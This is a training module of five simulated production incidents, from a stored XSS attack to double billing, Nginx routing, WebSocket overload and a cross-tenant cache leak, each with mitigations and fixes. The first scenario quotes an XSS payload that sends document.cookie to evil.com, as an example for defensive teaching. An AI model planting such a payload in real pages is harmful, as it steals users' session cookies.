# Module 20.2 — Simulated Production Incident Scenarios (P0 to P1 Deep Dives)

## Scenario 1: P0 Active Security Breach (Stored XSS Token Theft)
- **Incident Summary:** Security team alerts that an attacker posted a malicious comment in customer forums containing `<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">`.
- **Immediate Mitigation:**
  1. Purge forum comment cache in Redis.
  2. Deploy WAF rule blocking comments containing `onerror=` or `<script>`.
- **Permanent Fix:** Sanitize all rich text via `DOMPurify.sanitize(html)` inside `<SanitizedHtml />`.

---

## Scenario 2: P0 Double-Billing Loop Under Gateway Latency
- **Incident Summary:** Stripe charges customers twice when checkout API experiences a 15-second database lock contention.
- **Immediate Mitigation:** Disable frontend retry interceptor for non-GET requests.
- **Permanent Fix:**
  1. Generate unique `Idempotency-Key` on payment button click.
  2. Enforce atomic Redis `SET NX EX` in Spring Boot payment filter before dispatching charge to Stripe.

---

## Scenario 3: P1 Nginx SPA 404 Deep Navigation Outage
- **Incident Summary:** Following a production deployment, all users clicking email notification links (e.g. `/invoices/9921`) receive `404 Not Found`.
- **Immediate Mitigation:** N/A (requires config patch).
- **Permanent Fix:** Add `try_files $uri $uri/ /index.html;` to Nginx `location /` block and reload Nginx.

---

## Scenario 4: P1 Real-Time WebSocket Render Storm
- **Incident Summary:** During market opening volatility, trading terminal UI locks up at 100% CPU usage.
- **Immediate Mitigation:** Throttle WebSocket message broadcast rate on Spring Boot message broker.
- **Permanent Fix:** Buffer incoming ticks into an in-memory mutable ref and flush to React state only inside `requestAnimationFrame`.

---

## Scenario 5: P1 Multi-Tenant Cache Leak Across Workspaces
- **Incident Summary:** Users switching between enterprise workspaces momentarily see financial invoices belonging to other organizations.
- **Immediate Mitigation:** Force full page reload (`window.location.reload()`) on workspace switch.
- **Permanent Fix:** Include `orgId` as root partition in all query keys (`['workspace', orgId, 'invoices']`) and call `queryClient.clear()` on organization switch.
